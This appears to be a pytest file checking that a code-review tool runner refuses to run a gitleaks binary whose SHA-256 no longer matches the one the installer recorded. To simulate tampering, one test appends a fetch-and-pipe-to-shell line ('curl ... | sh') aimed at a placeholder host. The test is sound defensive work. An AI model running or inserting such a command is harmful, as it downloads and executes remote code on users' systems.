"""The review's tool runner runs a single-file tool only when the file in the tool directory is the one the installer
recorded (mara.tools.runner.installed_file_problem; scripts/install_tools.py records `installed_sha256`). The installer
checks what it downloads against the lock; nothing checked that the binary was still that file when a review ran it."""

from __future__ import annotations

import hashlib
import json
import stat
import subprocess
from pathlib import Path

import pytest

from mara.tools import runner
from tests import tool_installs

EMPTY_SARIF = json.dumps({"version": "2.1.0", "runs": [{"tool": {"driver": {"name": "gitleaks"}}, "results": []}]})
BINARY = b"#!/bin/sh\nexit 0\n"


@pytest.fixture
def installed(tmp_path, monkeypatch):
    """A tool directory with a gitleaks binary at its locked version, and a runner whose tool processes are faked: each
    writes an empty SARIF, and `ran` lists the tools that were run. Gives (tools_dir, set_entry, run, ran)."""
    tools_dir = tmp_path / "tools"
    exe = tools_dir / "bin" / "gitleaks"
    exe.parent.mkdir(parents=True)
    exe.write_bytes(BINARY)
    exe.chmod(exe.stat().st_mode | stat.S_IXUSR)
    ran: list[str] = []

    def fake_run(cmd, cwd, timeout=600, env=None):
        ran.append(Path(cmd[0]).name)
        Path(cmd[cmd.index("--report-path") + 1]).write_text(EMPTY_SARIF, encoding="utf-8")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(runner, "_run", fake_run)

    def set_entry(**fields):
        entry = {"version": tool_installs.locked("gitleaks"), "signature_verified": True, **fields}
        (tools_dir / "manifest.json").write_text(json.dumps({"tools": {"gitleaks": entry}}), encoding="utf-8")

    def run() -> runner.ToolRun:
        (tmp_path / "target").mkdir(exist_ok=True)
        (only,) = runner.run_all(tmp_path / "target", tmp_path / "out", enabled=["gitleaks"], workspace=tool_installs.workspace(tools_dir))
        return only

    return tools_dir, set_entry, run, ran


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def test_the_binary_the_installer_recorded_is_run(installed):
    _, set_entry, run, ran = installed
    set_entry(kind="archive", installed_sha256=_sha(BINARY))
    result = run()
    assert result.ran and ran == ["gitleaks"] and result.note == f"pinned {tool_installs.locked('gitleaks')}"


@pytest.mark.parametrize("kind", ["archive", "binary"])
def test_a_binary_that_is_not_the_one_the_installer_recorded_is_not_run(installed, kind):
    tools_dir, set_entry, run, ran = installed
    set_entry(kind=kind, installed_sha256=_sha(BINARY))
    exe = tools_dir / "bin" / "gitleaks"
    exe.write_bytes(BINARY + b"curl https://example.invalid/x | sh\n")  # the same name, the same version in the manifest
    result = run()
    assert ran == [], "the changed binary was run"
    assert not result.ran and "is not the one the installer recorded" in result.note
    assert "install_tools.py --only gitleaks" in result.note and _sha(exe.read_bytes())[:16] in result.note
    exe.write_bytes(BINARY)  # put back, it runs again: the hash is read from the file each time it changes
    assert run().ran and ran == ["gitleaks"]


def test_a_single_file_tool_whose_manifest_holds_no_hash_of_it_is_not_run(installed):
    """An install made before the installer recorded it: the review says to install again, and does not run a binary
    nothing vouches for."""
    _, set_entry, run, ran = installed
    for fields in ({"kind": "archive"}, {"kind": "archive", "installed_sha256": ""}, {"kind": "binary", "installed_sha256": None}):
        set_entry(**fields)
        result = run()
        assert ran == [] and not result.ran, fields
        assert "before the installer recorded" in result.note and "install_tools.py --only gitleaks" in result.note


@pytest.mark.parametrize("fields", [{}, {"kind": "pip"}, {"kind": "npm"}, {"kind": "git"}])
def test_a_tool_that_is_not_one_file_is_run_as_before(installed, fields):
    """semgrep is a virtual environment, csp-evaluator a package directory, the rules a checkout: none has one file
    whose hash is the tool's. A manifest entry without a kind is the stand-in of a test (tests/tool_installs.py)."""
    _, set_entry, run, ran = installed
    set_entry(**fields)
    assert run().ran and ran == ["gitleaks"]


def test_the_version_is_checked_before_the_file(installed):
    _, set_entry, run, ran = installed
    set_entry(kind="archive", installed_sha256=_sha(b"another binary"), version="0.0.1")
    result = run()
    assert not result.ran and ran == [] and "is not the one the installer recorded" not in result.note


def test_what_is_wrong_with_an_installed_file_is_said_by_one_function(tmp_path):
    exe = tmp_path / "tool"
    exe.write_bytes(BINARY)
    problem = runner.installed_file_problem
    assert problem("t", exe, {"kind": "archive", "installed_sha256": _sha(BINARY)}) is None
    assert problem("t", exe, None) is None and problem("t", exe, {"kind": "npm"}) is None
    assert "is not the one" in problem("t", exe, {"kind": "binary", "installed_sha256": _sha(b"x")})
    assert "cannot be read" in problem("t", tmp_path / "gone", {"kind": "archive", "installed_sha256": _sha(BINARY)})
